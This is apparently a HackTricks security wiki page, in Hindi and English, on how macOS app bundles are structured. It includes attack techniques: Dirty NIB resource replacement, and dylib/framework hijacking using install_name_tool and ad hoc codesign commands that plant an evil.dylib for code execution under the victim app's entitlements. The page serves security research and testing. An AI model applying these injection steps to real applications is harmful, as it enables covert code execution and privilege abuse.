# macOS बंडल

{{#include ../../../banners/hacktricks-training.md}}

## बुनियादी जानकारी

macOS में बंडल विभिन्न संसाधनों के कंटेनर के रूप में कार्य करते हैं, जिनमें एप्लिकेशन, लाइब्रेरीज़, और अन्य आवश्यक फ़ाइलें शामिल हैं, और ये Finder में एकल ऑब्जेक्ट के रूप में दिखाई देते हैं, जैसे परिचित `*.app` फाइलें। सबसे सामान्य मिलने वाला बंडल `.app` बंडल है, हालांकि अन्य प्रकार जैसे `.framework`, `.systemextension`, और `.kext` भी प्रचलित हैं।

### बंडल के आवश्यक घटक

एक बंडल के भीतर, विशेष रूप से `<application>.app/Contents/` निर्देशिका के अंदर, कई महत्वपूर्ण संसाधन रखे जाते हैं:

- **\_CodeSignature**: यह डायरेक्टरी ऐप्लिकेशन की सत्यता सत्यापित करने के लिए आवश्यक code-signing विवरण संग्रहीत करती है। आप code-signing जानकारी को निम्नलिखित कमांड्स से जाँच सकते हैं:
```bash
openssl dgst -binary -sha1 /Applications/Safari.app/Contents/Resources/Assets.car | openssl base64
```
- **MacOS**: उपयोगकर्ता इंटरैक्शन पर चलने वाला एप्लिकेशन का executable बाइनरी रखता है।
- **Resources**: एप्लिकेशन के user interface घटकों के लिए एक रिपॉज़िटरी — images, documents, और interface descriptions (nib/xib files) शामिल हैं।
- **Info.plist**: एप्लिकेशन की मुख्य configuration फ़ाइल के रूप में कार्य करता है, जिससे सिस्टम एप्लिकेशन को सही तरीके से पहचानकर इंटरैक्ट कर सके।

#### Info.plist में महत्वपूर्ण कुंजियाँ

The `Info.plist` file एप्लिकेशन कॉन्फ़िगरेशन की आधारशिला है, जिसमें निम्नलिखित कुंजियाँ होती हैं:

- **CFBundleExecutable**: `Contents/MacOS` directory में स्थित मुख्य executable फ़ाइल का नाम निर्दिष्ट करता है।
- **CFBundleIdentifier**: एप्लिकेशन के लिए एक वैश्विक पहचानकर्ता प्रदान करता है, जिसे macOS एप्लिकेशन प्रबंधन में व्यापक रूप से उपयोग करता है।
- **LSMinimumSystemVersion**: उस macOS के न्यूनतम संस्करण को दर्शाता है जिसकी आवश्यकता ऐप को चलाने के लिए होती है।

### Bundles का अन्वेषण

किसी बंडल, जैसे `Safari.app`, की सामग्री देखने के लिए निम्न कमांड उपयोग की जा सकती है: `bash ls -lR /Applications/Safari.app/Contents`

यह अन्वेषण `_CodeSignature`, `MacOS`, `Resources` जैसे डायरेक्टरी और `Info.plist` जैसी फ़ाइलें दर्शाता है; प्रत्येक का अलग उद्देश्य होता है — एप्लिकेशन को सुरक्षित करना, उपयोगकर्ता इंटरफ़ेस को परिभाषित करना और संचालन पैरामीटर सेट करना।

#### अतिरिक्त बंडल डायरेक्टरीज़

आम डायरेक्टरीज़ के अलावा, बंडल में यह भी शामिल हो सकते हैं:

- **Frameworks**: एप्लिकेशन द्वारा उपयोग किए जाने वाले बंडल किए गए frameworks। Frameworks dylibs की तरह होते हैं जिनमें अतिरिक्त resources होते हैं।
- **PlugIns**: प्लग‑इन्स और एक्सटेंशन्स के लिए डायरेक्टरी जो एप्लिकेशन की क्षमताओं को बढ़ाते हैं।
- **XPCServices**: आउट‑ऑफ‑प्रोसेस कम्यूनिकेशन के लिए एप्लिकेशन द्वारा उपयोग किए जाने वाले XPC सेवाओं को रखता है।

यह संरचना सुनिश्चित करती है कि सभी आवश्यक घटक बंडल के भीतर संलग्न हों, जिससे मॉड्यूलर और सुरक्षित एप्लिकेशन वातावरण संभव हो।

`Info.plist` keys और उनके अर्थों पर अधिक विस्तृत जानकारी के लिए, Apple developer documentation व्यापक संसाधन प्रदान करता है: [Apple Info.plist Key Reference](https://developer.apple.com/library/archive/documentation/General/Reference/InfoPlistKeyReference/Introduction/Introduction.html).

## सुरक्षा नोट्स और दुर्व्यवहार वेक्टर

- **Gatekeeper / App Translocation**: जब कोई quarantined bundle पहली बार चलाया जाता है, macOS गहरे signature verification करता है और इसे randomized translocated path से चला सकता है। एक बार स्वीकार होने पर, बाद की लॉन्च पर केवल सतही जांचें होती हैं; ऐतिहासिक रूप से `Resources/`, `PlugIns/`, nibs आदि में resource फ़ाइलें unchecked रहती थीं। macOS 13 Ventura से पहले रन पर deep check लागू है और नया *App Management* TCC permission तीसरे‑पार्टी प्रक्रियाओं को बिना उपयोगकर्ता की सहमति के अन्य बंडलों को संशोधित करने से रोकता है, पर पुराने सिस्टम अभी भी कमजोर बने हुए हैं।
- **Bundle Identifier collisions**: एक ही `CFBundleIdentifier` का पुनः उपयोग करने वाले कई embedded targets (PlugIns, helper tools) signature validation तोड़ सकते हैं और कभी‑कभी URL‑scheme hijacking/confusion सक्षम कर सकते हैं। हमेशा sub‑bundles की enumeration करें और unique IDs सत्यापित करें।

## Resource Hijacking (Dirty NIB / NIB Injection)

Before Ventura, signed ऐप में UI resources बदलकर shallow code signing को बाइपास किया जा सकता था और ऐप के entitlements के साथ code execution प्राप्त किया जा सकता था। वर्तमान रिसर्च (2024) दिखाती है कि यह pre‑Ventura और un-quarantined builds पर अभी भी काम करता है:

1. लक्ष्य ऐप को एक writable location पर कॉपी करें (उदा., `/tmp/Victim.app`)।
2. `Contents/Resources/MainMenu.nib` (या `NSMainNibFile` में घोषित कोई भी nib) को एक malicious nib से बदलें जो `NSAppleScript`, `NSTask`, आदि instantiate करे।
3. ऐप लॉन्च करें। malicious nib victim के bundle ID और entitlements (TCC grants, microphone/camera, आदि) के अंतर्गत चलता है।
4. Ventura+ इसे पहले लॉन्च पर बंडल की deep‑verification करके और बाद के संशोधनों के लिए *App Management* permission की आवश्यकता रखकर कम करता है, इसलिए persistence कठिन है लेकिन पुराने macOS पर initial‑launch हमले अभी भी लागू होते हैं।

न्यूनतम malicious nib payload उदाहरण (xib को nib में compile करने के लिए `ibtool` का उपयोग करें):
```bash
# create a nib that runs osascript -e 'do shell script "id"'
# ...build xib in Xcode, then
ibtool --compile MainMenu.nib MainMenu.xib
cp MainMenu.nib /tmp/Victim.app/Contents/Resources/
open /tmp/Victim.app
```
## Bundles के अंदर Framework / PlugIn / dylib Hijacking

क्योंकि `@rpath` lookups bundled Frameworks/PlugIns को प्राथमिकता देते हैं, `Contents/Frameworks/` या `Contents/PlugIns/` के अंदर एक दुर्भावनापूर्ण लाइब्रेरी डालने से लोड ऑर्डर रीडायरेक्ट हो सकता है जब मुख्य बायनरी library validation के बिना या कमजोर `LC_RPATH` ordering के साथ साइन किया गया हो।

Typical steps when abusing an unsigned/ad‑hoc bundle:
```bash
cp evil.dylib /tmp/Victim.app/Contents/Frameworks/
install_name_tool -add_rpath @executable_path/../Frameworks /tmp/Victim.app/Contents/MacOS/Victim
# or patch an existing load command
install_name_tool -change @rpath/Legit.dylib @rpath/evil.dylib /tmp/Victim.app/Contents/MacOS/Victim
codesign -f -s - --timestamp=none /tmp/Victim.app/Contents/Frameworks/evil.dylib
codesign -f -s - --deep --timestamp=none /tmp/Victim.app
open /tmp/Victim.app
```
नोट्स:
- यदि Hardened runtime में `com.apple.security.cs.disable-library-validation` अनुपस्थित है तो यह third‑party dylibs को ब्लॉक करता है; पहले entitlements जाँचें।
- `Contents/XPCServices/` के अंतर्गत XPC services अक्सर sibling frameworks लोड करते हैं—उनके binaries को persistence या privilege escalation paths के लिए समान रूप से patch करें।

## त्वरित निरीक्षण चीटशीट
```bash
# list top-level bundle metadata
/usr/libexec/PlistBuddy -c "Print :CFBundleIdentifier" /Applications/App.app/Contents/Info.plist

# enumerate embedded bundles
find /Applications/App.app/Contents -name "*.app" -o -name "*.framework" -o -name "*.plugin" -o -name "*.xpc"

# verify code signature depth
codesign --verify --deep --strict /Applications/App.app && echo OK

# show rpaths and linked libs
otool -l /Applications/App.app/Contents/MacOS/App | grep -A2 RPATH
otool -L /Applications/App.app/Contents/MacOS/App
```
## संदर्भ

- [Bringing process injection into view(s): exploiting macOS apps using nib files (2024)](https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/)
- [Dirty NIB & bundle resource tampering write‑up (2024)](https://karol-mazurek.medium.com/snake-apple-app-bundle-ext-f5c43a3c84c4)
{{#include ../../../banners/hacktricks-training.md}}
